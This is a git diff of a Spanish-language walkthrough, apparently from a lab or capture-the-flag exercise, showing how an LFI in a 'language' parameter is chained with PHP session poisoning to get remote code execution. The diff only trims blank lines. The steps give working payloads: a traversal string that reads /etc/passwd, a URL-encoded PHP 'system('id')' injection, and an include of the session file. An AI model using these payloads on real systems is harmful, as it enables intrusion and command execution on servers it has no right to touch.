@@ -103,19 +103,16 @@ LFI en el parámetro `language` encadenada con envenenamiento de sesión PHP par
 - **Tip:** asegurate de que la request sea POST. En Burp: clic derecho sobre la request → _Change request method_.
 
 **Paso 1 — Verificar la LFI:**
-
 ```
 language=....//....//....//....//etc/passwd
 ```
 
 **Paso 2 — Enviar el payload malicioso** (`<?php system('id'); ?>` URL-encodeado):
-
 ```
 language=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
 ```
 
 **Paso 3 — Incluir el archivo de sesión** para recibir el valor de `id` y confirmar RCE:
-
 ```
 language=....//....//....//....//var/lib/php/sessions/sess_PHPSESSID
 ```
